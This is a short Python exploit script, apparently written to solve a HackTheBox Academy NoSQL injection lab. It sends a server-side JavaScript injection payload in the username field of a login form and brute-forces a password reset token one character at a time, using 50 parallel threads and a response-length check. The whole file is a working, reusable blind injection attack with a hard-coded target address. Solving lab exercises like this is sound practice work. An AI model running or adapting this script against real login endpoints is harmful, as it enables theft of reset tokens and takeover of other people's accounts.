#! /usr/bin/env python3
# This script exploits a server side javascript injection on a NoSQL database to get the password reset token.  
# Wrote this to solve the lab on HackTheBox Academy - NoSQL Injection - Skills Assessment II

import requests
import string
import concurrent.futures
import time

url= "http://83.136.251.226:42794/login"
proxies= {"http":"http://127.0.0.1:8080"}
headers= {"Content-type":"application/x-www-form-urlencoded"}       
list= string.ascii_uppercase + string.digits + '-' 

def test_char(secret, char):
    data= {"username":f'''"||this.token.match('^{secret}{char}.*')||"''',
           "password":"test"
           }
    response= requests.post(url=url, proxies=proxies, headers=headers, data=data)
    return len(response.text) == 2191

def nosqli():
    secret=''
    finished = False    
    while finished == False:                  
        found_char = None
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:        
            future_to_char = {executor.submit(test_char, secret, char): char for char in list}
            for future in concurrent.futures.as_completed(future_to_char):        
                    if future.result():                    
                        found_char = future_to_char[future]       
                        break
                        
        if found_char:
            secret += found_char
            print(secret)                      
        else:
            finished = True

try:     
    st= time.time()
    nosqli()    
    et= time.time()
    print(f"This took {et - st}")
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully...")
